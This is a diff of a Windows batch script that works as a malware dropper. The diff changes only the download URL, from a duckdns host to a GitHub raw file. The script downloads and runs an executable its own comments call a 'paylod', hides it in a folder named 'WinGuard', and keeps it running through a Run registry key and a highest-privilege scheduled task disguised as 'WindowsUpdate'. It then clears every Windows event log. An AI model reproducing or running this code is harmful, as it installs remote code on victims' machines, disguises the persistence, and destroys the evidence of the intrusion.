@@ -21,10 +21,11 @@ cls
 echo --------------------cerete-my-path--------------------------------------------------
 mkdir "%systemdrive%\programdata\WinGuard"
 echo ----------------------------copy-my-files-to-web-sever-------------------------------------
-PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://megoo.duckdns.org/Graphics.exe','%programdata%\WinGuard\Graphics.exe')
+PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/moyousry95/slash/raw/refs/heads/main/Graphics.exe','%programdata%\WinGuard\Graphics.exe')
 echo -----------start-paylod------------------------
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\WinGuard\Graphics.exe"
 schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\WinGuard\Graphics.exe" /f
 start %programdata%\WinGuard\Graphics.exe
 echo -----------delete-evnt-log-------------------------------------------
 for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
+
